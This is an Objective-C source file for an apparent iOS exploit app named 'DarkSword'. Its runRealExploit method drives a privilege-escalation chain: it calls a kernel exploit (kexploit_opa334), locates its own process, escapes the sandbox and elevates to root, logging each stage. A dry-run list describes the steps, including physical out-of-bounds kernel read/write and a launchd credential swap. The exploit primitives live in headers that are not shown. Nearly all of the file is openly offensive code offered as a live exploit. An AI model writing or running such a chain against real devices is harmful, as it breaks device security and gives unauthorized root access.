#import "ADSDarkEngine.h"
#import "kexploit_opa334.h"
#import "sandbox_escape.h"
#import "kutils.h"

@implementation ADSDarkEngine

- (NSString *)modeLabel {
    return @"LIVE EXPLOIT";
}

- (NSArray<NSArray<NSString *> *> *)dryRunStages {
    return @[
        @[@"[+] Initializing DarkSword exploit chain..."],
        @[@"offsets: loaded", @"krw: physical OOB ready"],
        @[@"kexploit_opa334: launching physical r/w..."],
        @[@"sandbox_escape: patching extensions..."],
        @[@"uid elevation: launchd ucred swap..."],
        @[@"[+] KERNEL R/W ACHIEVED", @"[+] SANDBOX ESCAPED"]
    ];
}

- (BOOL)runRealExploit {
    NSLog(@"[DarkSword] Starting REAL exploit...");
    
    int ret = kexploit_opa334();
    NSLog(@"[DarkSword] kexploit_opa334 returned: %d", ret);
    if (ret != 0) {
        NSLog(@"[-] kexploit_opa334 failed: %d", ret);
        dispatch_async(dispatch_get_main_queue(), ^{
            // будет показано в UI через appendLog
        });
        return NO;
    }
    NSLog(@"[+] kexploit_opa334 SUCCESS");
    
    uint64_t selfProc = proc_self();
    NSLog(@"[DarkSword] proc_self: 0x%llx", selfProc);
    if (selfProc == 0) {
        NSLog(@"[-] proc_self failed");
        return NO;
    }

    int escRet = sandbox_escape(selfProc);
    NSLog(@"[DarkSword] sandbox_escape returned: %d", escRet);
    if (escRet == 0) {
        int elevRet = sandbox_elevate_to_root(selfProc);
        NSLog(@"[DarkSword] sandbox_elevate_to_root returned: %d", elevRet);
        if (elevRet == 0) {
            NSLog(@"[+] ROOT ACHIEVED!");
            return YES;
        } else {
            NSLog(@"[-] elevate_to_root failed: %d", elevRet);
        }
    } else {
        NSLog(@"[-] sandbox_escape failed: %d", escRet);
    }
    return NO;
}

@end
